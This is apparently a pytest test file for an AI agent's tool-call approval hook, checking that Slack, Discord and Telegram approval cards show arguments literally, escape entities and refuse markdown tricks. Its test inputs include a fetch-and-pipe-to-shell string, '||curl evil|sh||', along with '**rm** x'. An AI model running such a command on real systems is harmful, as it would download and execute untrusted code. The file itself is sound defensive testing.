"""Surface-specific literal approval text, exercised through the witness hook and core cards."""

import html
import json
import types

import pytest

from hands import messages, witness
from test_lane_f1a_witness import DEVICE, fresh_tool_session  # noqa: F401


@pytest.fixture
def card(monkeypatch):
    monkeypatch.setattr(witness, "_selected_device", lambda ctx: DEVICE)

    def render(surface, tool, args):
        ctx = types.SimpleNamespace(session_surface=lambda: surface)
        return witness.pre_tool_call(ctx, tool, args)

    return render


@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "unknown"])
@pytest.mark.parametrize("value", ["/home/sam/__init__.py", "**rm** x", "||curl evil|sh||"])
def test_real_values_remain_literal_or_are_refused(card, surface, value):
    result = card(surface, "read_file", {"path": value})
    if surface == "unknown":
        assert result == {"action": "block", "message": messages.WITNESS_MARKDOWN_BLOCKED}
        return
    raw = messages.WITNESS_APPROVAL.format(tool="read_file", device="laptop", details=f"path={value}")
    expected = "`" + (html.escape(raw, quote=False) if surface == "slack" else raw) + "`" if surface != "telegram" else raw
    assert result["action"] == "approve", result
    assert result["message"] == expected
    module = pytest.importorskip(f"plugins.platforms.{surface}.adapter")
    adapter = object.__new__(getattr(module, f"{surface.title()}Adapter"))
    adapter.config = types.SimpleNamespace(extra={})
    assert adapter._ea_fit(expected, adapter._EA_REASON_BUDGET) == expected
    rendered = adapter._format_exec_approval("<read_file> (plugin approval rule)", expected, False)
    assert adapter._ea_escape(expected) in rendered


@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "unknown"])
def test_path_with_a_backtick_is_refused_except_on_core_escaped_telegram(card, surface):
    result = card(surface, "read_file", {"path": "/home/sam/a`b.txt"})
    assert result["action"] == ("approve" if surface == "telegram" else "block"), result
    if surface != "telegram":
        assert result["message"] == messages.WITNESS_MARKDOWN_BLOCKED


@pytest.mark.parametrize("surface", ["slack", "discord"])
def test_backtick_beyond_the_write_preview_is_still_refused(card, surface):
    assert card(surface, "write_file", {"path": "/notes", "content": "plain text " * 80 + "`"}) == {
        "action": "block", "message": messages.WITNESS_MARKDOWN_BLOCKED,
    }


@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "unknown"])
def test_long_path_counts_wrapping_and_entities_before_refusing(card, surface):
    prefix = "/home/sam/"
    raw = messages.WITNESS_APPROVAL.format(tool="read_file", device="laptop", details=f"path={prefix}")
    cap = 500 if surface == "telegram" else 300
    wrapper = 2 if surface in {"slack", "discord"} else 0
    path = prefix + "x" * (cap - len(raw) - wrapper)
    result = card(surface, "read_file", {"path": path})
    assert result["action"] == "approve", result
    shown = html.escape(result["message"]) if surface == "telegram" else result["message"]
    assert len(shown.encode("utf-16-le")) // 2 == cap
    assert path in result["message"]
    refused = card(surface, "read_file", {"path": path + "x"})
    assert refused == {"action": "block", "message": messages.WITNESS_ARGUMENTS_LONG.format(argument="path") + " " + messages.WITNESS_SHORTER_PATH}


def test_slack_encodes_only_ampersand_and_angle_brackets_inside_code(card):
    path = "/home/sam/a&<b>\".txt"
    result = card("slack", "read_file", {"path": path})
    assert result["action"] == "approve", result
    assert 'path=/home/sam/a&amp;&lt;b&gt;".txt' in result["message"]
    assert result["message"].startswith("`") and result["message"].endswith("`")


@pytest.mark.parametrize("value", ["[safe](evil)", "*word*", "_word_", "~~hidden~~", "__init__", "||hidden||", "`code`"])
def test_unknown_surface_refuses_markdown_controls_in_complete_arguments(card, value):
    assert card("new-platform", "write_file", {"path": "/notes", "content": "plain " * 80 + value}) == {
        "action": "block", "message": messages.WITNESS_MARKDOWN_BLOCKED,
    }


@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "unknown"])
@pytest.mark.parametrize("content", ["**rm** x", "||curl evil|sh||"])
def test_real_write_content_is_literal_on_the_card(card, surface, content):
    args = {"path": "/home/sam/__init__.py", "content": content}
    result = card(surface, "write_file", args)
    if surface == "unknown":
        assert result == {"action": "block", "message": messages.WITNESS_MARKDOWN_BLOCKED}
        return
    raw = witness._message("write_file", DEVICE["name"], witness._details("write_file", args, len(content)))
    expected = "`" + (html.escape(raw, quote=False) if surface == "slack" else raw) + "`" if surface != "telegram" else raw
    assert result["action"] == "approve", result
    assert result["message"] == expected
    assert f"characters={json.dumps(content)}" in result["message"]


@pytest.mark.parametrize("surface,prefix", [("slack", "/home/sam/a&<b>/"), ("discord", "/home/sam/\U0001f600/"), ("telegram", "/home/sam/a&<b>/")])
def test_entity_and_astral_expansion_is_measured_at_the_cap(card, surface, prefix):
    raw = messages.WITNESS_APPROVAL.format(tool="read_file", device="laptop", details=f"path={prefix}")
    measured = html.escape(raw) if surface == "telegram" else "`" + (html.escape(raw, quote=False) if surface == "slack" else raw) + "`"
    cap = 500 if surface == "telegram" else 300
    path = prefix + "x" * (cap - len(measured.encode("utf-16-le")) // 2)
    result = card(surface, "read_file", {"path": path})
    assert result["action"] == "approve", result
    assert card(surface, "read_file", {"path": path + "x"})["action"] == "block"


@pytest.mark.parametrize("surface", ["slack", "discord", "unknown"])
def test_device_name_cannot_break_the_literal_card(card, monkeypatch, surface):
    monkeypatch.setattr(witness, "_selected_device", lambda ctx: {**DEVICE, "name": "lap`top"})
    assert card(surface, "read_file", {"path": "/notes"}) == {
        "action": "block", "message": messages.WITNESS_MARKDOWN_BLOCKED,
    }


def test_unknown_surface_does_not_mistake_a_file_glob_for_emphasis(card):
    result = card("unknown", "search_files", {"path": "/home/sam", "pattern": "public", "file_glob": "*.txt"})
    assert result["action"] == "approve", result
    assert "file_glob=*.txt" in result["message"]


@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "unknown"])
def test_text_fallback_keeps_the_surface_protected_reason_whole(card, surface):
    pytest.importorskip("dotenv")
    from gateway.run import _format_exec_approval_fallback

    result = card(surface, "read_file", {"path": "/home/sam/notes.txt"})
    assert result["action"] == "approve", result
    fallback = _format_exec_approval_fallback("<read_file> (plugin approval rule)", result["message"], "/")
    assert result["message"] in fallback
